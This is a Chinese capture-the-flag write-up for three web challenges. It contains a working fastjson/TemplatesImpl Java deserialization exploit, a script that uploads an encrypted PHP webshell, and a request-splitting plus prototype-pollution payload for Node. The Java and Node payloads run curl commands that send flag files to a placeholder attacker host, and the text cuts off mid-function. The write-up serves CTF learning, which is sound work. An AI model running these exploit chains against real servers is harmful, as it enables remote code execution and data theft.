title="easy_api"></a>easy_api</h1><p>拿到war包还是先反编译，看到有一个fastjson-1.2.48 (敏感一点的师傅就会想到toString触发任意get方法了)</p><img src="/2023/02/03/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912023writeup/pc9.png" class="" title="pc9"><p>提供了一个&#x2F;api&#x2F;test 接口</p><img src="/2023/02/03/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912023writeup/pc10.png" class="" title="pc10"><p>过滤了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-string">&quot;java.lang.reflect.Proxy&quot;</span>, <br><span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>, <br><span class="hljs-string">&quot;sun.rmi.server.UnicastRef&quot;</span>, <br><span class="hljs-string">&quot;sun.rmi.transport.LiveRef&quot;</span>, <br><span class="hljs-string">&quot;sun.rmi.transport.tcp.TCPEndpoint&quot;</span>, <br><span class="hljs-string">&quot;java.rmi.server.RemoteObject&quot;</span>, <br><span class="hljs-string">&quot;java.rmi.server.RemoteRef&quot;</span>, <br><span class="hljs-string">&quot;java.rmi.server.ObjID&quot;</span>, <br><span class="hljs-string">&quot;java.rmi.RemoteObjectInvocationHandler&quot;</span>, <br><span class="hljs-string">&quot;java.rmi.server.UnicastRemoteObject&quot;</span>,<br><span class="hljs-string">&quot;java.rmi.registry.Registry&quot;</span><br></code></pre></td></tr></table></figure><p>从中看到，断掉打JRMP这个方法.</p><img src="/2023/02/03/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912023writeup/pc11.png" class="" title="pc11"><p>现在缺一个触发toString方法 ，把老熟人BadAttributeValueExpException 禁掉了可以用Xstring来替代<br>调用链：</p><p>Xstring#equals -&gt; fastjson#toString -&gt; TemplatesImpl#getOutputProperties</p><p>链子解决了,还有一个doFilter要绕过，经过测试双写&#x2F;&#x2F;可以绕过&#x2F;&#x2F;api&#x2F;test?</p><img src="/2023/02/03/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912023writeup/pc12.png" class="" title="pc12"><p>编写exp:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.xhlj;<br><br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Array;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setValue(templates,<span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br><br>        <span class="hljs-type">byte</span>[] code = getTemplatesImpl(<span class="hljs-string">&quot;curl http://ip:port -File=@/flag&quot;</span>);<br>        <span class="hljs-type">byte</span>[][] bytecodes = &#123;code&#125;;<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytecodes);<br>        setValue(templates,<span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>        jo.put(<span class="hljs-string">&quot;oops&quot;</span>,templates);<br><br><br>        <span class="hljs-type">XString</span> <span class="hljs-variable">xString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;xx&quot;</span>);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map1.put(<span class="hljs-string">&quot;yy&quot;</span>,jo);<br>        map1.put(<span class="hljs-string">&quot;zZ&quot;</span>,xString);<br>        map2.put(<span class="hljs-string">&quot;yy&quot;</span>,xString);<br>        map2.put(<span class="hljs-string">&quot;zZ&quot;</span>,jo);<br><br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> makeMap(map1,map2);<br><br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        oos.writeObject(s);<br>        oos.flush();<br>        oos.close();<br>        System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));<br><br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getTemplatesImpl(String cmd) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);<br>            ctClass.setSuperclass(superClass);<br>            <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ctClass.makeClassInitializer();<br>            constructor.setBody(<span class="hljs-string">&quot; try &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +<br>                <span class="hljs-string">&quot;\&quot;);\n&quot;</span> +<br>                <span class="hljs-string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot; &#125;&quot;</span>);<br>            <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br>            ctClass.defrost();<br>            <span class="hljs-keyword">return</span> bytes;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;&#125;;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object target, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> target.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> c.getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(target,value);<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap <span class="hljs-title function_">makeMap</span> <span class="hljs-params">(Object v1, Object v2 )</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        setValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>        Class nodeC;<br>        <span class="hljs-keyword">try</span> &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( ClassNotFoundException e ) &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>        &#125;<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">nodeCons</span> <span class="hljs-operator">=</span> nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>        nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br><br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>        Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v1, v1, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v2, v2, <span class="hljs-literal">null</span>));<br>        setValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意 + 和 &#x2F; 要经过url编码</p><img src="/2023/02/03/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912023writeup/pc13.png" class="" title="pc13"><p>通过curl 外带flag</p><img src="/2023/02/03/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912023writeup/pc14.png" class="" title="pc14"><h1 id="unusual-php"><a href="#unusual-php" class="headerlink" title="unusual php"></a>unusual php</h1><p>题目直接给到源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>]==<span class="hljs-string">&quot;upload&quot;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>], <span class="hljs-string">&quot;upload/&quot;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&quot;name&quot;</span>]);<br>&#125;<span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>]==<span class="hljs-string">&quot;read&quot;</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>]);<br>&#125;<span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>]==<span class="hljs-string">&quot;version&quot;</span>) &#123;<br>    <span class="hljs-title function_ invoke__">phpinfo</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>发现上传php马发现解析不了，但是上传正常的txt可以直接看得到内容是正常的，通过伪协议去读取上传的php文件，发现是乱码的，猜测是经过一定的加密操作。<br>读取&#x2F;proc&#x2F;self&#x2F;maps</p><img src="/2023/02/03/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912023writeup/pc15.png" class="" title="pc15"><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/lib/</span>php<span class="hljs-regexp">/extensions/</span>no-debug-non-zts-<span class="hljs-number">20190902</span>/zend_test.so<br></code></pre></td></tr></table></figure><p>读取之后，用python base64解码以二进制的形式写到文件，用ida加载。发现用rc4加密，且有key</p><img src="/2023/02/03/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912023writeup/pc16.png" class="" title="pc16"><p>为了复制的时候不让数据流失，rc4直接以base64结果输出</p><img src="/2023/02/03/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912023writeup/pc17.png" class="" title="pc17"><p>写一个上传的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><br><span class="hljs-keyword">import</span> requests<br><br><br><br><br>url = <span class="hljs-string">&quot;http://80.endpoint-e3b2218dc1d446008a7cacc77c3d9bee.ins.cloud.dasctf.com:81/?a=upload&quot;</span><br><br><br>data = base64.b64decode(<span class="hljs-string">&quot;473xeG4d3kJANayE56+fzrJLaDo2vg==&quot;</span>)<br>file = &#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;k4d0n.php&#x27;</span>,data)&#125;<br>s = requests.session()<br>recv_content = s.post(url=url,files=file)<br><span class="hljs-built_in">print</span>(recv_content.text)<br></code></pre></td></tr></table></figure><img src="/2023/02/03/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912023writeup/pc18.png" class="" title="pc18"><h1 id="real-ez-node"><a href="#real-ez-node" class="headerlink" title="real_ez_node"></a>real_ez_node</h1><p>源码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.<span class="hljs-title class_">Router</span>();<br><span class="hljs-keyword">const</span> safeobj = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;safe-obj&#x27;</span>);<br>router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-function">(<span class="hljs-params">req,res</span>)=&gt;</span>&#123;<br>  <span class="hljs-keyword">if</span> (req.<span class="hljs-property">query</span>.<span class="hljs-property">q</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;get q&#x27;</span>);<br>  &#125;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>);<br>&#125;)<br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/copy&#x27;</span>,<span class="hljs-function">(<span class="hljs-params">req,res</span>)=&gt;</span>&#123;<br>  res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;Content-type&#x27;</span>,<span class="hljs-string">&#x27;text/html;charset=utf-8&#x27;</span>)<br>  <span class="hljs-keyword">var</span> ip = req.<span class="hljs-property">connection</span>.<span class="hljs-property">remoteAddress</span>;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ip);<br>  <span class="hljs-keyword">var</span> obj = &#123;<br>      <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;&#x27;</span>,<br>  &#125;<br>  <span class="hljs-keyword">if</span> (!ip.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)) &#123;<br>      obj.<span class="hljs-property">msg</span>=<span class="hljs-string">&quot;only for admin&quot;</span><br>      res.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(obj));<br>      <span class="hljs-keyword">return</span><br>  &#125;<br>  <span class="hljs-keyword">let</span> user = &#123;&#125;;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> index <span class="hljs-keyword">in</span> req.<span class="hljs-property">body</span>) &#123;<br>      <span class="hljs-keyword">if</span>(!index.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;__proto__&quot;</span>))&#123;<br>          safeobj.<span class="hljs-title function_">expand</span>(user, index, req.<span class="hljs-property">body</span>[index])<br>      &#125;<br>    &#125;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>);<br>&#125;)<br><br><br>router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/curl&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">var</span> q = req.<span class="hljs-property">query</span>.<span class="hljs-property">q</span>;<br>    <span class="hljs-keyword">var</span> resp = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">if</span> (q) &#123;<br>        <span class="hljs-keyword">var</span> url = <span class="hljs-string">&#x27;http://localhost:3000/?q=&#x27;</span> + q<br>            <span class="hljs-keyword">try</span> &#123;<br>                http.<span class="hljs-title function_">get</span>(url,<span class="hljs-function">(<span class="hljs-params">res1</span>)=&gt;</span>&#123;<br>                    <span class="hljs-keyword">const</span> &#123; statusCode &#125; = res1;<br>                    <span class="hljs-keyword">const</span> contentType = res1.<span class="hljs-property">headers</span>[<span class="hljs-string">&#x27;content-type&#x27;</span>];<br>                  <br>                    <span class="hljs-keyword">let</span> error;<br>                    <span class="hljs-comment">// 任何 2xx 状态码都表示成功响应，但这里只检查 200。</span><br>                    <span class="hljs-keyword">if</span> (statusCode !== <span class="hljs-number">200</span>) &#123;<br>                      error = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Request Failed.\n&#x27;</span> +<br>                                        <span class="hljs-string">`Status Code: <span class="hljs-subst">$&#123;statusCode&#125;</span>`</span>);<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (error) &#123;<br>                      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error.<span class="hljs-property">message</span>);<br>                      <span class="hljs-comment">// 消费响应数据以释放内存</span><br>                      res1.<span class="hljs-title function_">resume</span>();<br>                      <span class="hljs-keyword">return</span>;<br>                    &#125;<br>                  <br>                    res1.<span class="hljs-title function_">setEncoding</span>(<span class="hljs-string">&#x27;utf8&#x27;</span>);<br>                    <span class="hljs-keyword">let</span> rawData = <span class="hljs-string">&#x27;&#x27;</span>;<br>                    res1.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">chunk</span>) =&gt;</span> &#123; rawData += chunk;<br>                    res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;request success&#x27;</span>) &#125;);<br>                    res1.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;end&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>                      <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-keyword">const</span> parsedData = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(rawData);<br>                        res.<span class="hljs-title function_">end</span>(parsedData+<span class="hljs-string">&#x27;&#x27;</span>);<br>                      &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>                        res.<span class="hljs-title function_">end</span>(e.<span class="hljs-property">message</span>+<span class="hljs-string">&#x27;&#x27;</span>);<br>                      &#125;<br>                    &#125;);<br>                  &#125;).<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>                    res.<span class="hljs-title function_">end</span>(<span class="hljs-string">`Got error: <span class="hljs-subst">$&#123;e.message&#125;</span>`</span>);<br>                  &#125;)<br>                res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;ok&#x27;</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>                res.<span class="hljs-title function_">end</span>(error+<span class="hljs-string">&#x27;&#x27;</span>);<br>            &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;search param &#x27;q&#x27; missing!&quot;</span>);<br>    &#125;<br>&#125;)<br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router;<br></code></pre></td></tr></table></figure><p>经典打csrf </p><img src="/2023/02/03/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912023writeup/pc19.png" class="" title="pc19"><p>safeobj.expand 是存在原型链污染的</p><img src="/2023/02/03/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912023writeup/pc20.png" class="" title="pc20"><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br><br><br><br><br>payloadRow = <span class="hljs-string">&#x27;&#x27;&#x27; HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Connection: keep-alive</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">POST /copy HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Content-Length: 204</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">constructor.prototype.constructor.prototype.outputFunctionName=__tmp1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;curl http://ip:port -F file=@/flag.txt&#x27;); __tmp2</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">GET / &#x27;&#x27;&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getParm</span>(<span class="hljs-params">payload</span>):<br>    payload = payload.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;%C4%A0&quot;</span>)<br>    payload = payload.replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;%C4%8D%C4%8A&quot;</span>)<br>    payload = payload.replace(<span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;%C4%A2&quot;</span>)<br>    payload = payload.replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;%C4%A7&quot;</span>)<br>    payload = payload.replace(<span class="hljs-string">&quot;`&quot;</span>, <span class="hljs-string">&quot;%C5%A0&quot;</span>)<br>    payload = payload.replace(<span 